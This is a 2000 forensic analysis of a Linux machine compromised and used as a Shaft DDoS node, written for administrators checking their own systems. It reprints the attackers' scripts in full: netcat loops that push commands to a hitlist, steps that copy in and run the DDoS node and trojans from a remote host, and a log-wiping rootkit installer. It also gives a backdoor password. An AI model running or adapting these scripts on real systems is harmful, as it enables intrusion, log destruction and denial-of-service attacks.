@@ -1,0 +1,512 @@
+                           ---[      ]---
+
+                 Analysis of a Shaft Node and Master
+         		   March 26, 2000
+
+                           ---[      ]---
+
+Rick Wash
+rlw6@po.cwru.edu
+
+Jose Nazario
+jose@biocserver.cwru.edu
+
+
+Section 0: Introduction
+=======================
+
+This analysis is in addition to Sven Dietrich's analysis, dated March 16, 2000,
+of the Shaft DDoS tool.  The analysis we provide here is a description of the
+rootkit used and the methods of distribution of the tool. We share this 
+information so that other site and system administrators can examine their
+systems for comprimise and use as Shaft nodes. 
+
+Note:  This file can be found at:
+  http://biocserver.cwru.edu/~jose/shaft_analysis/
+
+The user names and host ID's have been munged.  We have tried to contact the
+domain admins whose networks have appeared anywhere in any of these files.
+
+---------[ How We Found This Information
+
+Once we were alerted that our machine may have been compromised, we performed
+both network and host based scans.  A network port scan (using nmap) revealed
+port 5002/tcp open and listening.  Furthermore, it revealed port 22/tcp (ssh)
+open, which was not installed by the system administrator.
+
+A host based scan revealed similarly that port 5002/tcp was listening.  An
+analysis with rpm -Va revealed differences in sizes and MD5 sums for the
+components of the root kit, but did not reveal the Shaft toolkit.  At this time
+the system was taken offline and the disk was mounted in another trusted system
+and analyzed from there.  
+
+Local administrators had noted that the system had become unstable over autumn,
+corresponding to the tests of the Shaft DDoS tool.  
+
+
+Section 1:  The Rootkit Used
+============================
+
+----------------[ What We Found
+  
+One of the significant things we found while analyzing the box was a directory
+and set of files that I will call the sda69 toolkit.  It was found in /dev
+(/dev/sda69 and 4 files sda69[a-d]).  This appears to be the attackers working
+directory, so most of their scripts and files are stored there.
+
+It appears that much of their older work from when they originally compromised 
+the box was stored in a subdirectory called ". " (dot space, "/dev/sda69/. ").
+This directory contained 6 files that compromised a system for sniffing the
+ethernet network and analyzing the sniffer logs.  Here is a list of files and
+what they do:
+
+  -rwxr-xr-x   1 0        20          28969 Apr  4  1999 idle
+
+This was their sniffer.  It was designed to sniff ports 21/tcp and 23/tcp (ftp 
+and telnet, respectively).  It was capture the first x number of bytes of each
+connection, log them to a file, and move on to the next connection.  This was
+used to gather passwords, since both ftp and telnet send passwords over
+plaintext.  This sniffer only logged in one direction (the data flowing from
+the machine that started the connection to the destination machine).  This was
+done because the other direction rarely contains useful information.  The
+output file in this case was tcp.log.  The program was named idle probably to
+fool any sysadmin who noticed it in ps and make them believe it was just idle
+time.
+
+  -rw-r--r--   1 0        0          456799 Jun 11  1999 tcp.log
+
+This was their sniffer log.  It contained data in the form:
+src_ip => dst_ip [port]
+data
+...
+
+----- [method of connection termination]
+This log only contained information for ports 21 and 23.  It did also contain a
+number of passwords.
+
+  -rwxr-xr-x   1 0        0            2795 May 12  1999 pp.pl
+
+This was a perl script that extracted usernames and passwords from their
+sniffer log files.
+
+  -rw-r--r--   1 0        0               6 Apr 28  1999 sniff.pid
+
+This is a standard pid lock file for the sniffer. 
+
+  -rw-r--r--   1 0        20           7654 Apr  4  1999 s
+
+A simple SYN flood program.
+
+  -rwxrwxr-x   1 0        0            7656 Aug 28  1998 chattr
+
+This is the standard linux chattr program, linked dynamically against libc6.  
+
+This material in ". " shows that the attackers did use this box for sniffing
+passwords from the ethernet network that it was connected to.  It is currently
+unknown if the attackers did any thing else during this time frame (May-June
+1999).
+
+--------[ Linux Trojan Horse Programs Found
+
+Investigation of the Linux host comprimised yielded the following trojan
+horse programs. They were found by mounting the disc read-only and without
+executable permissions set. A full recursive file listing was then 
+performed (ls -lartRi /mnt) which quickly revealed the trojan horse binaries:
+
+  20563 -rwxrwxr-x   1 root     root       437428 Sep 15  1998 vi
+  20554 -rwxrwxr-x   1 root     root       262756 Oct  2  1998 tcsh
+ 313370 -r-xrwxr-x   1 root     root        31312 Oct  3  1998 ps
+
+Examination of the binaries using strings(1), together with additional files
+on the system, reveals the method of operation of the new binaries. 
+
+The file sizes were sometimes larger, most likely due to being statically
+linked against an older C library (libc5 on a libc6 system).
+
+On a running host, examination by using RPM in verify mode (rpm -Va) showed
+file sizes, permissions and MD5 sums were off when compared to the database
+on the system. 
+
+	ls
+
+The ls trojan we found has the effect of not listing files listed in a 
+hidden configuration file, /dev/sda69c. As such, it's highly extensible. 
+Several utiities were hidden, including elements of the Shaft toolkit and
+even some terminals.
+
+	netstat
+
+Examination of the replaced netstat binary reveals that it is used to
+hide connections to or from certain networks and on certain ports. The
+networks and ports were configured using the file /dev/sda69b, an additional
+element of the rootkit.
+
+	ps
+
+Again, used to hide activity. The trojan horse ps(1) binary makes a reference
+to the file /dev/sda69a, which contains a listing of processes and terminals
+to hide. A fairly typical rootkit listing, including sniffers, scanners,
+the eggdrop IRC script, and the backdoored sshd.
+
+	updatedb
+
+The program updatedb(1L), normally a link to slocate(1), was replaced with 
+shell script. Again, used to hide signs of the rootkit tools.
+
+	locate
+
+Similar to updatedb's trojan, used to hide the rootkit and Shaft toolkit.
+
+	find
+
+Again, used to hide the toolkits, calls the file /dev/sda69c in a similar
+way to the ls trojan to hide files.
+
+	dir
+	vdir
+
+See ls, used in the same fashion.
+
+	killall
+
+Replaced, calls /dev/sda69a, a listing of processes and terminals. Used to
+prevent the halting of the intruder's processes. 
+
+	syslogd
+
+Replaced, calls /dev/sda69d, a list of domains. Presumably it prevents logging
+when hosts from these domains connect.
+
+	tcpd
+
+The TCP wrappers executable, calls /dev/sda69b and prevents access checking
+from those networks and on those ports.
+
+	inetd
+
+Appears to be a combined portmapper and inetd daemon, perhaps to allow for
+access or system control via RPC calls.
+
+	sshd
+
+Trojaned sshd 1.2.26, static linked against libc5.  Contains a backdoor
+password "rOOTkIT" which yeilds a root shell without logging.
+
+	ifconfig
+
+Replaced, with the trojan version omitting any reporting of the PROMISC 
+setting, hiding the use of the sniffing software.
+
+
+-----------[ Solaris SPARC Trojans Found
+
+During the course of our investigation into the toolkit, we also found several
+key binaries for Solaris as trojan horse programs. Witin the archive (neet.tar)
+there is a script plus several binary replacement for the SPARC acrhitecture.
+The script installs an inetd trojan, a ps and update trojan as well. These
+are then run. Log wiping is also done. System comprimise is presumably
+through a known exploit. We performed no real analysis on the trojan horse
+programs for SPARC as we did not examine a Solaris node of the Shaft tool.
+
+
+  -rwx------   1 510      510         39544 Mar 18  1999 doc
+
+This appears to be their trojaned SPARC Solaris inetd binary.
+
+  -rwx------   1 510      510         24356 Mar 18  1999 ps
+
+This appears to be their trojaned SPARC Solaris ps binary.
+
+  -rwx------   1 510      510         25548 Mar 18  1999 update
+
+Solaris does not use update, though SunOS 4.x did. This is probably to 
+confuse the administrator should they stumble across the file. According to
+George Weaver <weaver@gabriel.nso.psu.edu> this is a standard solsniffer, a
+Solaris sniffer. The logfiles are expected to be in /usr/man/tmp/output on 
+infected Solaris boxes.  
+
+
+----------[ Trojan Executable Configuration Files
+
+In addition to these files, four more files were recovered that appear to
+contain information used by the rootkit that was installed on this system.
+These files are /dev/sda69[a-d].  Here is a listing of what is contained in
+these files:
+
+  sda69a
+
+This file has the format:
+<number> <name>
+where number indicates what type of information follows (always either 1 or 3)
+and name indicates the data.  For this file, 1 indicates that what follows is a
+terminal name, and 3 indicates that what follows is a executable name.  This
+file is used by the trojaned ps and killall to prevend the sysadmin from seeing
+or killing the executables listed here, or anything from the listed terminals.
+The contents of the file:
+
+3 egg
+3 linsniffer
+1 p0
+1 p1
+3 sniffer
+3 mscan
+3 bash
+3 idle
+3 screen
+3 ssynk4
+3 sshd
+3 ssh
+3 sshd1
+3 s
+
+  sda69b
+ 
+The format of this file is the same as the format of sda69a, but the contents
+differ.  The 1 in this case means that the data is a subnet to ignore.  The 3
+in this case is a specific port number.  This file is used by the trojaned
+netstat and tcpd to know which IP's to hide, which IP's to always let in,
+and which ports to hide.  An example contents follows:
+
+
+1 xxx.
+3 6667
+1 yyy.
+3 23
+1 zzz.
+1 ddd.eee
+1 ccc.
+3 513
+1 bbb.aaa.
+3 22
+
+Here, the three letter combinations represent single numbers from IP addresses. 
+This file would specify that everyone from xxx.*.*.* would be allowed in this
+machine, and no connections from these IP's would appear in netstat.  Also,
+programs listening on ports 6667, 23, 513, and 22 (irc, telnet, rlogin, and
+ssh) would not appear in a normal netstat.
+
+  sda69c
+
+This file is a list of files, one file per line, that were installed on this
+system by the attackers.  This file is used by ls, dir, vdir, and find to know
+what files not to list when the admin tries to look through the filesystem.
+
+  sda69d
+
+This file is a list of providers, one per line.  This file is used by the
+trojaned syslog to know what messages should not be logged.
+
+
+Section 2: Distribution Methods of the Shaft Toolkit
+====================================================
+
+Their more recent work (which includes working with the Shaft DDoS tool) is all
+in the base sda69 directory (/dev/sda69).  Here is a list of files recovered
+and what the do:
+
+  -rwxr-xr-x   1 0        0           25123 Nov 28 14:34 shaftmaster
+  -rwxr-xr-x   1 0        0           15184 Nov 28 14:47 shaftnode
+
+This is the master and node executables for the Shaft DDoS tool.  For more
+information, see: http://sled.gsfc.nasa.gov/~spock/shaft_analysis.txt
+
+  -rwxr-xr-x   1 0        0           19806 Nov 28 14:41 shaftnode.c
+
+This is the source file for the Shaft node program.  More information can be
+found at the same location as above.  
+
+  -rwxr-xr-x   1 0        0          165632 Nov 28 16:34 nc
+
+This appears to be the standard netcat executable. This executable was 
+used by the scripts to remotely execute commands.
+
+  -rw-r--r--   1 0        0             596 Nov 28 17:12 hitlist
+
+This file contains a list of target machines, one machine per line. These
+were evidently targets to receive the shaftnode program, having previously
+been compromised.
+
+  -rwxr-xr-x   1 0        0              84 Nov 28 16:36 dos.sh
+
+This shell script run the command dospipe.sh and sends the output to each of
+the IP's in the file hitlist, port 21 (ftp).  This script is a wrapper around
+dospipe.sh that executes it for each of the machines in hitlist and sends it to
+the machine.  Here is the code from that file:
+
+#!/bin/sh
+for i in `cat hitlist` ; do (./dospipe.sh | ./nc -p 53982 $i 21 &) ; done
+
+  -rwxr-xr-x   1 0        0             186 Nov 28 16:41 dospipe.sh
+
+This shell script outputs a series of commands that are intended to upload and
+run a copy of their shaftnode executable to the target machine.  This script
+automates the process of uploading and running their node executables.  Here is
+the code for the script:
+
+#!/bin/sh
+echo "oir##t"
+echo "QUIT"
+sleep 5
+echo "cd /tmp"
+sleep 5
+echo "rcp user@host:shaftnode ./"
+sleep 5
+echo "chmod +x shaftnode"
+sleep 5
+echo "./shaftnode"
+echo "exit"
+
+The first couple lines (the first two echo commands) appear to signify that a
+backdoor is being used on the target machines' ftp servers to get the rootshell
+they need.  The first two lines are sent to the trojanned ftp server, and the 
+following lines appear to be commands send to a root shell.
+
+  -rwxr-xr-x   1 0        0          122880 Oct 24 02:13 duh.tar
+
+This is a tar file archive of the next five files: bd.sh, bdpipe.sh, massbd.sh,
+neet.tar and unf.
+
+  -rwxr-xr-x   1 0        0             104 Oct 24 01:55 unf
+
+This file is another list of IP's, presumably a list of targets for this "bd"
+system.
+
+  -rwxr-xr-x   1 0        0           10240 Oct 24 02:11 bd.sh
+
+This, despite its file extension, is a tar file containing the two files
+bdpipe.sh and massbd.sh.  I believe that this being a tar file is a mistake and
+that is should be a shell script that resembles the script dos.sh.
+
+  -rwxr-xr-x   1 0        0              53 Aug  7  1999 massbd.sh
+
+This is a shell script that iterates through all of the lines in a file and
+runs the scripts bd.sh on each of them in the background.  This means that it
+runs bd.sh on each of the lines in the file roughly at the same time.  I
+suppose that the file unf is used for this purpose.  Here is the code for the
+script:
+
+#!/bin/sh
+for i in `cat $1`; do (./bd.sh $i &);done
+
+  -rwxr-xr-x   1 0        0             192 Aug  8  1999 bdpipe.sh
+
+This is a file that is used to upload and install their trojans and rootkits on
+a SPARC machine, as well as delete the logs and such.  It copies neet.tar over
+to the target machine, run the script bd, and cleans up their work.  Here is
+the code for the script:
+
+#!/bin/sh
+echo "cd /tmp;"
+echo "rcp user@host:neet.tar ./;"
+sleep 4
+echo "tar -xvf neet.tar;"
+sleep 4
+echo "./bd;"
+sleep 10
+echo "rm -rf neet.tar bd update*;"
+sleep 10
+echo "exit;"
+
+It appears that they already have a root shell by the time this script is run.
+Getting the root shell could very well be the contents of the real bd.sh.
+
+  -rwxr-xr-x   1 0        0          102400 Aug  7  1999 neet.tar
+
+This is a tar file that contains 4 other files: bd (a shell script), ps,
+update, and doc (three SPARC executables).
+
+  -rwx------   1 510      510          1076 Aug  5  1999 bd
+
+This is a shell script.  This is the executable that is run by the other
+scripts once a system is compromised.  This script does a number of things.
+First of all it copies in its trojaned version of inetd.  Secondly it removes
+most of the log files on the system that would implicate them.  Then it runs
+their trojaned inetd and tests it with a telnet session (presumably to test the
+backdoor).  Then is kills inetd, nfs, and ttdb.  Next it runs their update
+program. Finally it copies their ps program to replace the current system one.
+Here is the full source of this script:
+
+unset HISTFILE; unset SAVEHIST
+cp doc /usr/sbin/inetd;
+chown root /usr/sbin/inetd;
+chgrp root /usr/sbin/inetd;
+touch 0716000097 /usr/sbin/inetd;
+rm -rf doc /tmp/bob /var/adm/messages /usr/lib/nfs/statd /usr/openwin/bin/rpc.ttdb* /usr/dt/bin/rpc.ttdb*
+rm -rf /var/log/messages /var/adm/sec* /var/adm/mail* /var/log/mail* /var/adm/sec*
+rm -rf /usr/openwin/bin/rpc.cmsd
+rm -rf /usr/dt/bin/rpc.cmsd
+/usr/sbin/inetd -s;
+/usr/sbin/inetd -s;
+telnet localhost;
+/usr/sbin/inetd -s;
+ps -ef | grep inetd | grep bob | awk '{print "kill -9 " $2 }' > boo
+chmod 700 boo
+./boo
+ps -ef | grep nfs | grep statd | awk '{print "kill -9 " $2 }' > boo
+chmod 700 boo
+./boo
+ps -ef | grep ttdb | grep -v grep  | awk '{print "kill -9 " $2 }' > boo
+chmod 700 boo
+./boo
+rm -rf boo
+mkdir /usr/man/tmp
+mv update ps /usr/man/tmp
+cd /usr/man/tmp
+echo 1 \"./update -s -o output\" > /kernel/pssys
+chmod 755 ps update
+./update -s -o output &
+cp ps /usr/ucb/ps
+mv ps /usr/bin/ps
+touch 0716000097 /usr/bin/ps /usr/ucb/ps
+cd /
+ps -ef | grep bob | grep -v grep
+ps -ef | grep stat | grep -v grep
+ps -ef | grep update
+
+
+Section 3: What You Can Do
+==========================
+
+We have, we hope, outlined methods for administrators to examine their
+systems for compromise by the distributors of the Shaft DDoS tool. A 
+combination of a generic rootkit together with the DDoS package created
+a ring of machines which could be used to disrupt large network segments.
+
+The most important thing is what is repeatedly said -- apply the vendor 
+patches for security updates and keep your system current. Access was gained,
+no doubt, through well known holes which had patches released some time before
+by the vendor. This simple action would have prevented most of the nodes
+of the tool form being acquired.
+
+Secondly, any alert system administrator would have noticed the performance
+of the machine degrade for no appearant reason. The local administrators of
+this node complained of crashes and performance problems of this server, yet
+were not qualified administrators. This is a standard problem, and one that
+can be easily avoided by training or hiring competent administrators.
+
+While the steps we outlined above are above these simple, basic system level
+administration actions, prevention of this kind of compromise is easily
+done. Any organization should facilitate the spread of vendor supplied
+security patches.
+
+As noted in the introduction, we have attempted to contact the administrators
+of the domains listed in the target lists for the distribution of the toolkit
+or in the records of where the intruders connected. We are providing this
+analysis to the community in an effort to facilitate the cleanup from this 
+ring of intrusions. It spreads worldwide, including Europe and the Pacific
+Rim, focusing largely on academic instritutions. We have appreciated the 
+response from the community when contacted, and offer to help in any additional
+ways.
+
+Special thanks to George Weaver from PSU for some of his analysis on the SPARC
+trojans we found.
+
+Section 4: Selected References
+=====================
+
+Dietrich, Sven: Shaft Analysis: http://sled.gsfc.nasa.gov/~spock/shaft_analysis.txt
+
+nmap  http://www.insecure.org/nmap
+
+netcat  ftp://coast.cs.purdue.edu/pub/tool/unix/netcat
+
